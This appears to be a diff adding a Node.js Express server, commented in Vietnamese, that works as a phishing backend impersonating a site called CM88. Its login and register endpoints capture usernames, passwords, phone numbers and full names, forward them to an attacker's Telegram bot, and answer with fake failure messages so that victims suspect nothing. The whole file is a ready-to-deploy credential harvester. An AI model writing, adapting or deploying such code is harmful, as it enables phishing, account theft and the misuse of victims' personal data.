@@ -1,0 +1,53 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const axios = require('axios');
+const path = require('path');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+// Thay Token Bot và Chat ID Telegram của bạn vào đây
+const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+async function sendTelegram(message) {
+    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') return;
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+    } catch (e) {
+        console.log('Lỗi gửi Telegram:', e.message);
+    }
+}
+
+// Bắt dữ liệu đăng nhập
+app.post('/api/login', async (req, res) => {
+    const { username, password } = req.body;
+    const info = `🚨 <b>[LOGIN CM88]</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>`;
+    
+    console.log(info);
+    await sendTelegram(info);
+
+    res.json({ status: 'error', message: 'Tài khoản không chính xác' });
+});
+
+// Bắt dữ liệu đăng ký
+app.post('/api/register', async (req, res) => {
+    const { username, password, phone, fullname } = req.body;
+    const info = `🎁 <b>[REGISTER CM88]</b>\n👤 Tài khoản: <code>${username}</code>\n🔑 Mật khẩu: <code>${password}</code>\n📞 SĐT: <code>${phone}</code>\n📝 Họ tên: <code>${fullname}</code>`;
+    
+    console.log(info);
+    await sendTelegram(info);
+
+    res.json({ status: 'error', message: 'Đăng ký thất bại' });
+});
+
+app.listen(PORT, () => {
+    console.log(`Server đang chạy tại http://localhost:${PORT}`);
+});
